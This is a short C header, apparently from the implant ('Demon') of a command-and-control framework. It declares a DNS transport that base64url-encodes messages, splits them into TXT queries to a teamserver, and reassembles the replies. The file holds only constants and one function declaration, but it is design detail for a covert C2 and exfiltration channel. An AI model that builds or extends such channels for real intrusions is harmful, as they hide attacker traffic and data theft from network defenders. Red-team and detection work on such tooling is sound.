#ifndef DEMON_TRANSPORTDNS_H
#define DEMON_TRANSPORTDNS_H

#include <windows.h>
#include <windns.h>

#include <core/Win32.h>

#ifdef TRANSPORT_DNS

/* A single query carries at most this many base64url characters. It must
 * match handlers.DNSChunkChars on the teamserver. */
#define DNS_CHUNK_CHARS 180

/* Labels are limited to 63 bytes and a name to 253 bytes. */
#define DNS_LABEL_CHARS 63
#define DNS_MAX_NAME    253

/* Largest raw message the teamserver will reassemble:
 * DNSMaxChunks (512) * DNSChunkChars (180) encoded chars. */
#define DNS_MAX_REQUEST_LENGTH 0x10000 /* 64k */

/* How often the last chunk is re-queried to pick up a cached answer. */
#define DNS_RETRY_LAST 3

/*!
 * Sends one transport message to the teamserver over DNS.
 *
 * The message is base64url encoded and split into sequential TXT queries.
 * The teamserver reassembles the chunks by request token, processes the
 * message and returns its answer as TXT strings on the query that completed
 * the message. On success and when Resp is not NULL, Resp->Buffer holds the
 * decoded response (allocated with MmHeapAlloc) and Resp->Length its size.
 *
 * @param Send buffer to send
 * @param Resp optional response buffer
 * @return TRUE when the teamserver answered the message
 */
BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
);

#endif

#endif
